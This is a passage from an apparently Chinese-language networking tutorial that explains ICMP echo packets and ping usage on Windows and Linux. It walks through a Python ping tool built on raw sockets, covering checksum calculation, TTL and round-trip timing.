class="hljs-section">+---------------+---------------+---------------+---------------+</span><br><br>字段说明：<br><span class="hljs-bullet">- </span>类型：8=请求，0=回应<br><span class="hljs-bullet">- </span>代码：通常为0<br><span class="hljs-bullet">- </span>校验和：用于检测数据完整性<br><span class="hljs-bullet">- </span>标识符：标识这个ping进程<br><span class="hljs-bullet">- </span>序列号：标识这是第几个包<br><span class="hljs-bullet">- </span>数据：可选的负载数据<br></code></pre></td></tr></table></figure><h2 id="🔧-使用ping命令">🔧 使用ping命令</h2><h3 id="基本用法">基本用法</h3><p><strong>Windows</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 基本ping</span><br>ping baidu.com<br><br><span class="hljs-comment"># ping 4次后停止</span><br>ping -n 4 baidu.com<br><br><span class="hljs-comment"># 指定包大小（字节）</span><br>ping -l 1000 baidu.com<br><br><span class="hljs-comment"># 持续ping</span><br>ping -t baidu.com<br></code></pre></td></tr></table></figure><p><strong>Linux/Mac</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 基本ping</span><br>ping baidu.com<br><br><span class="hljs-comment"># ping 4次后停止</span><br>ping -c 4 baidu.com<br><br><span class="hljs-comment"># 指定包大小（字节）</span><br>ping -s 1000 baidu.com<br><br><span class="hljs-comment"># 快速ping（间隔0.2秒）</span><br>ping -i 0.2 baidu.com<br></code></pre></td></tr></table></figure><h3 id="输出解析">输出解析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ping baidu.com<br><br>PING baidu.com (220.181.38.148): 56 data bytes<br>64 bytes from 220.181.38.148: icmp_seq=0 ttl=52 <span class="hljs-keyword">time</span>=28.5 ms<br>64 bytes from 220.181.38.148: icmp_seq=1 ttl=52 <span class="hljs-keyword">time</span>=27.8 ms<br>64 bytes from 220.181.38.148: icmp_seq=2 ttl=52 <span class="hljs-keyword">time</span>=28.1 ms<br>64 bytes from 220.181.38.148: icmp_seq=3 ttl=52 <span class="hljs-keyword">time</span>=29.2 ms<br><br>--- baidu.com ping statistics ---<br>4 packets transmitted, 4 packets received, 0.0% packet loss<br>round-trip min/avg/max/stddev = 27.8/28.4/29.2/0.5 ms<br></code></pre></td></tr></table></figure><p><strong>字段含义</strong>：</p><ul><li><code>64 bytes</code>：数据包大小</li><li><code>icmp_seq</code>：序列号（第几个包）</li><li><code>ttl=52</code>：生存时间（经过了64-52=12个路由器）</li><li><code>time=28.5 ms</code>：RTT往返时间</li><li><code>0.0% packet loss</code>：丢包率</li><li><code>min/avg/max</code>：最小/平均/最大RTT</li></ul><h2 id="🔧-实战项目：实现简易ping工具">🔧 实战项目：实现简易ping工具</h2><p>让我们用Python实现一个简单的ping工具！</p><h3 id="代码实现">代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day05_simple_ping.py</span><br><span class="hljs-comment"># 功能：实现简单的ping工具</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_checksum</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    计算ICMP校验和</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        data: 要计算校验和的数据（bytes）</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回：</span><br><span class="hljs-string">        校验和（int）</span><br><span class="hljs-string"></span><br><span class="hljs-string">    工作原理：</span><br><span class="hljs-string">        1. 将数据按16位分组求和</span><br><span class="hljs-string">        2. 如果有进位，将进位加到结果上</span><br><span class="hljs-string">        3. 取反码得到校验和</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 如果数据长度是奇数，补一个字节0</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>        data += <span class="hljs-string">b&#x27;\x00&#x27;</span><br><br>    <span class="hljs-comment"># 按16位（2字节）分组求和</span><br>    checksum = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">2</span>):<br>        <span class="hljs-comment"># 将两个字节组合成一个16位整数</span><br>        word = (data[i] &lt;&lt; <span class="hljs-number">8</span>) + data[i + <span class="hljs-number">1</span>]<br>        checksum += word<br><br>    <span class="hljs-comment"># 处理进位：将高16位加到低16位</span><br>    <span class="hljs-keyword">while</span> checksum &gt;&gt; <span class="hljs-number">16</span>:<br>        checksum = (checksum &amp; <span class="hljs-number">0xFFFF</span>) + (checksum &gt;&gt; <span class="hljs-number">16</span>)<br><br>    <span class="hljs-comment"># 取反码</span><br>    checksum = ~checksum &amp; <span class="hljs-number">0xFFFF</span><br><br>    <span class="hljs-keyword">return</span> checksum<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_icmp_packet</span>(<span class="hljs-params">packet_id, sequence</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    创建ICMP Echo Request数据包</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        packet_id: 标识符（用于区分不同的ping进程）</span><br><span class="hljs-string">        sequence: 序列号（标识第几个包）</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回：</span><br><span class="hljs-string">        完整的ICMP数据包（bytes）</span><br><span class="hljs-string"></span><br><span class="hljs-string">    ICMP包结构：</span><br><span class="hljs-string">        [类型(1字节) | 代码(1字节) | 校验和(2字节) |</span><br><span class="hljs-string">         标识符(2字节) | 序列号(2字节) | 数据]</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># ICMP类型：8=Echo Request</span><br>    icmp_type = <span class="hljs-number">8</span><br>    <span class="hljs-comment"># ICMP代码：0</span><br>    icmp_code = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># 校验和：先设为0，稍后计算</span><br>    icmp_checksum = <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># 打包ICMP头部（不包括校验和）</span><br>    <span class="hljs-comment"># ! = 网络字节序（大端）</span><br>    <span class="hljs-comment"># B = unsigned char (1字节)</span><br>    <span class="hljs-comment"># H = unsigned short (2字节)</span><br>    header = struct.pack(<span class="hljs-string">&#x27;!BBHHH&#x27;</span>, icmp_type, icmp_code, icmp_checksum,<br>                         packet_id, sequence)<br><br>    <span class="hljs-comment"># 数据部分：发送时间戳（用于计算RTT）</span><br>    data = struct.pack(<span class="hljs-string">&#x27;!d&#x27;</span>, time.time())<br><br>    <span class="hljs-comment"># 计算校验和</span><br>    icmp_checksum = calculate_checksum(header + data)<br><br>    <span class="hljs-comment"># 重新打包，加入正确的校验和</span><br>    header = struct.pack(<span class="hljs-string">&#x27;!BBHHH&#x27;</span>, icmp_type, icmp_code, icmp_checksum,<br>                         packet_id, sequence)<br><br>    <span class="hljs-keyword">return</span> header + data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_icmp_reply</span>(<span class="hljs-params">packet</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    解析ICMP Echo Reply数据包</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        packet: 接收到的数据包</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回：</span><br><span class="hljs-string">        (icmp_type, icmp_code, icmp_id, icmp_seq, send_time)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># IP头部通常是20字节，ICMP从第21字节开始</span><br>    icmp_header = packet[<span class="hljs-number">20</span>:<span class="hljs-number">28</span>]<br><br>    <span class="hljs-comment"># 解析ICMP头部</span><br>    icmp_type, icmp_code, checksum, packet_id, sequence = struct.unpack(<br>        <span class="hljs-string">&#x27;!BBHHH&#x27;</span>, icmp_header<br>    )<br><br>    <span class="hljs-comment"># 解析数据部分的时间戳</span><br>    send_time = struct.unpack(<span class="hljs-string">&#x27;!d&#x27;</span>, packet[<span class="hljs-number">28</span>:<span class="hljs-number">36</span>])[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-keyword">return</span> icmp_type, icmp_code, packet_id, sequence, send_time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ping</span>(<span class="hljs-params">host, count=<span class="hljs-number">4</span>, timeout=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ping指定主机</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        host: 目标主机名或IP地址</span><br><span class="hljs-string">        count: ping的次数</span><br><span class="hljs-string">        timeout: 超时时间（秒）</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回：</span><br><span class="hljs-string">        统计信息字典</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;PING <span class="hljs-subst">&#123;host&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># 解析主机名为IP地址</span><br>    <span class="hljs-keyword">try</span>:<br>        dest_ip = socket.gethostbyname(host)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;目标IP: <span class="hljs-subst">&#123;dest_ip&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">60</span>)<br>    <span class="hljs-keyword">except</span> socket.gaierror:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;❌ 无法解析主机名: <span class="hljs-subst">&#123;host&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># 创建原始socket（需要root权限）</span><br>    <span class="hljs-keyword">try</span>:<br>        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)<br>        sock.settimeout(timeout)<br>    <span class="hljs-keyword">except</span> PermissionError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ 需要管理员权限运行此程序&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;💡 Linux/Mac: sudo python day05_simple_ping.py&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;💡 Windows: 以管理员身份运行&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># 统计信息</span><br>    packet_id = <span class="hljs-number">12345</span>  <span class="hljs-comment"># 可以用进程ID</span><br>    sent = <span class="hljs-number">0</span><br>    received = <span class="hljs-number">0</span><br>    rtt_list = []<br><br>    <span class="hljs-comment"># 发送ping包</span><br>    <span class="hljs-keyword">for</span> seq <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 创建ICMP包</span><br>            packet = create_icmp_packet(packet_id, seq)<br><br>            <span class="hljs-comment"># 发送</span><br>            send_time = time.time()<br>            sock.sendto(packet, (dest_ip, <span class="hljs-number">0</span>))<br>            sent += <span class="hljs-number">1</span><br><br>            <span class="hljs-comment"># 接收回复</span><br>            <span class="hljs-keyword">try</span>:<br>                reply_packet, addr = sock.recvfrom(<span class="hljs-number">1024</span>)<br>                recv_time = time.time()<br><br>                <span class="hljs-comment"># 解析回复</span><br>                icmp_type, icmp_code, reply_id, reply_seq, packet_send_time = \<br>                    parse_icmp_reply(reply_packet)<br><br>                <span class="hljs-comment"># 检查是否是我们的包的回复</span><br>                <span class="hljs-keyword">if</span> icmp_type == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> reply_id == packet_id <span class="hljs-keyword">and</span> reply_seq == seq:<br>                    <span class="hljs-comment"># 计算RTT</span><br>                    rtt = (recv_time - packet_send_time) * <span class="hljs-number">1000</span>  <span class="hljs-comment"># 转换为毫秒</span><br>                    rtt_list.append(rtt)<br>                    received += <span class="hljs-number">1</span><br><br>                    <span class="hljs-comment"># 获取TTL</span><br>                    ttl = struct.unpack(<span class="hljs-string">&#x27;!B&#x27;</span>, reply_packet[<span class="hljs-number">8</span>:<span class="hljs-number">9</span>])[<span class="hljs-number">0</span>]<br><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;✅ 来自 <span class="hljs-subst">&#123;dest_ip&#125;</span>: icmp_seq=<span class="hljs-subst">&#123;seq&#125;</span> ttl=<span class="hljs-subst">&#123;ttl&#125;</span> &quot;</span><br>                          <span class="hljs-string">f&quot;time=<span class="hljs-subst">&#123;rtt:<span class="hljs-number">.2</span>f&#125;</span> ms&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;⚠️  收到意外的ICMP包 type=<span class="hljs-subst">&#123;icmp_type&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">except</span> socket.timeout:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;⏱️  icmp_seq=<span class="hljs-subst">&#123;seq&#125;</span> 请求超时&quot;</span>)<br><br>            <span class="hljs-comment"># 等待1秒再发送下一个包</span><br>            <span class="hljs-keyword">if</span> seq &lt; count - <span class="hljs-number">1</span>:<br>                time.sleep(<span class="hljs-number">1</span>)<br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;❌ 发送失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>    sock.close()<br><br>    <span class="hljs-comment"># 打印统计信息</span><br>    <span class="hljs-built_in">print</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">60</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📊 <span class="hljs-subst">&#123;host&#125;</span> ping统计信息:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   发送: <span class="hljs-subst">&#123;sent&#125;</span> 个包&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   接收: <span class="hljs-subst">&#123;received&#125;</span> 个包&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   丢失: <span class="hljs-subst">&#123;sent - received&#125;</span> 个包 (<span class="hljs-subst">&#123;((sent-received)/sent*<span class="hljs-number">100</span>):<span class="hljs-number">.1</span>f&#125;</span>% loss)&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> rtt_list:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   RTT: 最小=<span class="hljs-subst">&#123;<span class="hljs-built_in">min</span>(rtt_list):<span class="hljs-number">.2</span>f&#125;</span>ms, &quot;</span><br>              <span class="hljs-string">f&quot;平均=<span class="hljs-subst">&#123;<span class="hljs-built_in">sum</span>(rtt_list)/<span class="hljs-built_in">len</span>(rtt_list):<span class="hljs-number">.2</span>f&#125;</span>ms, &quot;</span><br>              <span class="hljs-string">f&quot;最大=<span class="hljs-subst">&#123;<span class="hljs-built_in">max</span>(rtt_list):<span class="hljs-number">.2</span>f&#125;</span>ms&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">60</span>)<br><br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&#x27;sent&#x27;</span>: sent,<br>        <span class="hljs-string">&#x27;received&#x27;</span>: received,<br>        <span class="hljs-string">&#x27;rtt_list&#x27;</span>: rtt_list<br>    &#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    主函数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">60</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;简易Ping工具&quot;</span>.center(<span class="hljs-number">60</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">60</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># 获取目标主机</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>        host = sys.argv[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        host = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要ping的主机名或IP: &quot;</span>).strip()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> host:<br>            host = <span class="hljs-string">&quot;baidu.com&quot;</span>  <span class="hljs-comment"># 默认</span><br><br>    <span class="hljs-comment"># 执行ping</span><br>    result = ping(host, count=<span class="hljs-number">4</span>, timeout=<span class="hljs-number">3</span>)<br><br>    <span class="hljs-keyword">if</span> result <span class="hljs-keyword">and</span> result[<span class="hljs-string">&#x27;received&#x27;</span>] &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;🎉 Ping完成！&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ Ping失败或网络不可达&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="运行程序">运行程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Linux/Mac（需要root权限）</span><br><span class="hljs-built_in">sudo</span> python code/day05/day05_simple_ping.py baidu.com<br><br><span class="hljs-comment"># Windows（以管理员身份运行）</span><br>python code\day05\day05_simple_ping.py baidu.com<br><br><span class="hljs-comment"># 不带参数运行，会提示输入主机名</span><br><span class="hljs-built_in">sudo</span> python code/day05/day05_simple_ping.py<br></code></pre></td></tr></table></figure><h3 id="预期输出">预期输出</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">============================================================<br>                       简易Ping工具<br>============================================================<br><br>PING baidu.com<br><br><span class="hljs-section">目标IP: 220.181.38.148</span><br><span class="hljs-section">------------------------------------------------------------</span><br>✅ 来自 220.181.38.148: icmp<span class="hljs-emphasis">_seq=0 ttl=52 time=28.50 ms</span><br><span class="hljs-emphasis">✅ 来自 220.181.38.148: icmp_seq=1 ttl=52 time=27.82 ms</span><br><span class="hljs-emphasis">✅ 来自 220.181.38.148: icmp_seq=2 ttl=52 time=28.15 ms</span><br><span class="hljs-emphasis">✅ 来自 220.181.38.148: icmp_</span>seq=3 ttl=52 time=29.20 ms<br><br><span class="hljs-code">------------------------------------------------------------</span><br><span class="hljs-code">📊 baidu.com ping统计信息:</span><br><span class="hljs-code">   发送: 4 个包</span><br><span class="hljs-code">   接收: 4 个包</span><br><span class="hljs-code">   丢失: 0 个包 (0.0% loss)</span><br><span class="hljs-code">   RTT: 最小=27.82ms, 平均=28.42ms, 最大=29.20ms</span><br><span class="hljs-code">------------------------------------------------------------</span><br><br>🎉 Ping完成！<br></code></pre></td></tr></table></figure><h2 id="🔍-代码详解">🔍 代码详解</h2><h3 id="1-为什么需要root权限？">1. 为什么需要root权限？</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)<br></code></pre></td></tr></table></figure><p><strong>原始套接字</strong>（SOCK_RAW）可以构造任意的IP包，这是一个强大的功能，所以操作系统要求必须有管理员权限才能使用。</p><h3 id="2-校验和的计算">2. 校验和的计算</h3><p>校验和用于检测数据在传输过程中是否损坏：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 原理：</span><br><span class="hljs-number">1.</span> 将数据按<span class="hljs-number">16</span>位分组<br><span class="hljs-number">2.</span> 所有分组相加<br><span class="hljs-number">3.</span> 如果有进位，加到低<span class="hljs-number">16</span>位<br><span class="hljs-number">4.</span> 对结果取反码<br><br><span class="hljs-comment"># 接收方验证：</span><br><span class="hljs-number">1.</span> 对收到的数据（包括校验和）做同样的计算<br><span class="hljs-number">2.</span> 如果结果是<span class="hljs-number">0xFFFF</span>，说明数据完整<br><span class="hljs-number">3.</span> 否则说明数据损坏<br></code></pre></td></tr></table></figure><h3 id="3-TTL的含义">3. TTL的含义</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">TTL (Time To Live) <span class="hljs-operator">=</span> 生存时间<br><br>初始值：通常是<span class="hljs-number">64</span>或<span class="hljs-number">128</span><br>每经过一个路由器：TTL -<span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>当TTL <span class="hljs-operator">=</span> <span class="hljs-number">0</span>：路由器丢弃该包，返回超时错误<br><br>作用：防止数据包在网络中无限循环<br></code></pre></td></tr></table></figure><h3 id="4-时间戳的作用">4. 时间戳的作用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 发送时在数据部分嵌入时间戳</span><br>data = struct.pack(<span class="hljs-string">&#x27;!d&#x27;</span>, time.time())<br><br><span class="hljs-comment"># 收到回复时，解析时间戳</span><br>send_time = struct.unpack(<span class="hljs-string">&#x27;!d&#x27;</span>, packet[<span class="hljs-number">28</span>:<span class="hljs-number">36</span>])[<span class="hljs-number">0</span>]<br><br><span class="hljs-comment"># 计算RTT</span><br>rtt = (recv_time - send_time) * <span class="hljs-number">1000</span>  <span class="hljs-comment"># 毫秒</span><br></code></pre></td></tr></table></figure><h2 id="🎓-知识小结">🎓 知识小结</h2><h3 id="今天学到了什么？">今天学到了什么？</h3><ol><li>✅ 